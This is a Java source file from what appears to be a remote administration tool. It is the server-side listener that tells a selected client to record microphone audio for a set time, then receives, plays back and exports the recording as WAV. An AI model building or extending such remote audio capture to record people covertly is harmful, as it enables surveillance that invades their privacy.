package Server.FeatureListener;

import Events.FeatureListener;
import Server.ClientEntity.ClientEntity;
import Server.Overlay.Controller.Controller;
import Server.Server;
import Tools.Network.NetworkInterface;
import Tools.Ref;
import javafx.application.Platform;
import javafx.stage.DirectoryChooser;

import javax.sound.sampled.*;
import java.io.*;
import java.util.*;

import static Tools.Globals.Sleep;
import static Tools.Globals.map;

public class AudioCaptureListener extends FeatureListener {

    private final List<Byte> allRecordings = new ArrayList<>();
    private final Map<Integer, byte[]> recordingInBytes = new LinkedHashMap<>();

    private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
    private static AudioInputStream audioIn;

    private final DataLine.Info info = new DataLine.Info(Clip.class, format);

    private int size, idCounter;

    private byte time;
    private long totalTime;

    private byte[] allByteBuffer;

    public AudioCaptureListener(Controller controller, Server server) {
        super(controller, server);
    }

    @Override
    protected Runnable run(Controller controller) {
        return () -> {
            while (runningFeature) {
                byte[] buffer = server.getBuffer();

                Sleep(1000 / 60);

                if (buffer[0] == NetworkInterface.CommandByte.AUDIOCAPTURE_INFO_STOP) finalizeAudioData();

                if (buffer[0] != NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE) continue;

                int id = (buffer[1] & 0xFF);

                if (!recordingInBytes.containsKey(id + idCounter)) {
                    byte[] audioData = (byte[]) objectHandler.readModifiedObjects(buffer, 2).get();
                    System.out.println("SOUND PACKET: " + (id + idCounter) + " LOADED!");
                    recordingInBytes.put(id + idCounter, audioData);
                    size += audioData.length;
                }

                if (id == 255) idCounter += 255;
            }
        };
    }

    private void finalizeAudioData() {
        server.resetBuffer();

        byte[] mainBuffer = sumBytes(recordingInBytes, size);
        size = 0;

        for (byte b : mainBuffer) allRecordings.add(b);

        allByteBuffer = sumBytes(allRecordings);
        audioIn = new AudioInputStream(new ByteArrayInputStream(allByteBuffer), format, allByteBuffer.length);

        Platform.runLater(() -> {
            long minutes = (totalTime % 3600 - totalTime % 3600 % 60) / 60;
            long seconds = totalTime % 3600 % 60;
            if (seconds < 10) controller.audioCaptureSliderLabel.setText(String.format("%d:0%d", minutes, seconds));
            else controller.audioCaptureSliderLabel.setText(String.format("%d:%d", minutes, seconds));

            controller.audioCaptureSlider.setMax(totalTime);
            controller.audioCaptureSlider.setMin(0);
            controller.audioCaptureSlider.setShowTickLabels(true);
            controller.audioCaptureSlider.setMajorTickUnit(totalTime / 10f);
            controller.audioCaptureSlider.setBlockIncrement(1);
        });
        recordingInBytes.clear();
        controller.audioCapturingConf.setDisable(false);
    }

    private Runnable play() {
        return () -> {
            controller.audioCaptureSlider.setValue(0);

            try {
                if (audioIn.getFormat().matches(format)) {
                    Clip clip = (Clip) AudioSystem.getLine(info);

                    clip.open(audioIn);
                    clip.start();

                    FloatControl control = (FloatControl) clip.getControl(FloatControl.Type.MASTER_GAIN);
                    new Thread(() -> {
                        while (clip.isOpen()) {
                            control.setValue(map((int) controller.volumeSlider.getValue(), 0, 100, -10, 6));
                        }
                    }).start();

                    System.out.println("Playing!");
                    Thread.sleep(totalTime * 1000);

                    clip.stop();
                    clip.close();
                    audioIn.close();
                }
            } catch (InterruptedException | LineUnavailableException | IOException e) {
                e.printStackTrace();
            }
        };
    }

    @Override
    protected void initComponents(Ref<ClientEntity> selectedClientSup) {
        controller.audioCaptureButton.selectedProperty().addListener((observableValue, oldValue, newValue) -> {
            ClientEntity selectedClient = selectedClientSup.obj;
            controller.audioCapturingConf.setOnAction(actionEvent -> {
                if (newValue && selectedClient != null) {
                    runningFeature = true;
                    thread.execute(run(controller));

                    int inputTime = Integer.parseInt(controller.audioCapturingTime.getText());
                    time = (byte) inputTime;
                    totalTime += inputTime;

                    try {
                        packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE, time}, 2, selectedClient.getAddress(), selectedClient.getPort());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    controller.audioCapturingConf.setDisable(true);
                    controller.audioCaptureSlider.setValue(0);
                }
            });
            if (oldValue && selectedClient != null) {
                runningFeature = false;
                try {
                    packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE_STOP}, 1, selectedClient.getAddress(), selectedClient.getPort());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
        //it will lock up the app unless i put those in to seperate threads.
        controller.audioCaptureStart.setOnAction(actionEvent -> {
            new Thread(play()).start();
            new Thread(() -> {
                while (controller.audioCaptureSlider.getValue() != controller.audioCaptureSlider.getMax()) {
                    Sleep(1000);
                    controller.audioCaptureSlider.increment();
                }
            }).start();
        });

        controller.audioCaptureSelectFolder.setOnAction(actionEvent -> {
            DirectoryChooser directoryChooser = new DirectoryChooser();
            File selectedFolder = directoryChooser.showDialog(controller.primaryStage);
            controller.audioCapturePathLabel.setText("Selected Path: " + selectedFolder.getPath() + "\n" + "Exporting...");

            try {
                File file = new File(selectedFolder.getPath() + "/file(0).wav");
                AudioSystem.write(audioIn, AudioFileFormat.Type.WAVE, file);
            } catch (IOException e) {
                e.printStackTrace();
            }

            controller.audioCapturePathLabel.setText("Selected Path: " + selectedFolder.getPath() + "\n" + "Exported!");
        });
    }

    @Override
    public void disposeAll() {
        runningFeature = false;
        thread.shutdown();
    }

    private byte[] sumBytes(Map<Integer, byte[]> collection, int size) {
        final byte[] mainBuffer = new byte[size];
        int ptr = 0;
        for (byte[] b : collection.values()) {
            for (byte value : b) {
                mainBuffer[ptr++] = value;
            }
        }
        return mainBuffer;
    }

    private byte[] sumBytes(List<Byte> collection) {
        final byte[] mainBuffer = new byte[collection.size()];
        for (int i = 0; i < collection.size(); i++) {
            mainBuffer[i] = allRecordings.get(i);
        }
        return mainBuffer;
    }
}
